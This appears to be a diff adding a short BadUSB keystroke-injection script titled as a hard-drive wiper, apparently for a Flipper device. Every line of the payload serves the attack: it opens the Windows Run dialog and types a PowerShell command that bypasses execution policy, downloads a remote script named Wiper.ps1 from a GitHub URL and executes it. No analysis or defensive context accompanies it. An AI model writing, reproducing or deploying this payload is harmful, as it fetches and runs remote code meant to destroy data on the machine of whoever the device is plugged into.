@@ -1,0 +1,5 @@
+# Harddrive Wiper BadUSB by Ertonbax
+GUI r
+DELAY 800
+STRING powershell -NoP -Exec Bypass "irm https://raw.githubusercontent.com/Ertonbax/Flipper-BadUSB/refs/heads/main/Payloads/Wiper.ps1 | iex"
+ENTER
